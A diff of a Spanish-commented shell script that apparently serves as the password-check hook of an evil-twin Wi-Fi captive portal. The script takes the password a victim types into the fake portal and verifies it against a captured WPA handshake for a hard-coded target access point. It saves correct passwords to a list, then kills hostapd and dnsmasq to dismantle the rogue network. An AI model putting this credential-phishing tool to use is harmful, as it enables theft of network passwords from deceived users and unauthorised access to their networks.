@@ -4,12 +4,10 @@
 #                 verificacion de que la contraseña metida sea la correcta.
 
 
-AP_MAC="A4:98:13:5B:64:E9"
+
 HANDSAHKE="/home/uo263762/handshake.cap"
+AP_MAC="A4:98:13:5B:64:E9"
 PASSWORD_FILE="password.lst"
-
-
-
 
 METHOD="$1"
 CLIENTMAC="$2"
@@ -18,8 +16,6 @@ case "$METHOD" in
        auth_client)
                USERNAME="$3"
                PASSWORD="$4"
-               
-               
                # Guardamos la contraseña dada por el usuario de forma temporal hasta comprobar que sea correcta.
 	       echo "$4" > last_password.lst
                # Comprobamos si la contraseña dada por el usuario es la correcta.
@@ -31,7 +27,8 @@ case "$METHOD" in
 	             # Guardamos la contraseña correcta.
                      echo "$4" >> $PASSWORD_FILE
 		     # Desmontamos todo el chiringuito
-                     ps kill
+		     sudo killall hostapd
+		     sudo killall dnsmasq
 		     exit 0
                else
                      # Contraseña incorrecta!
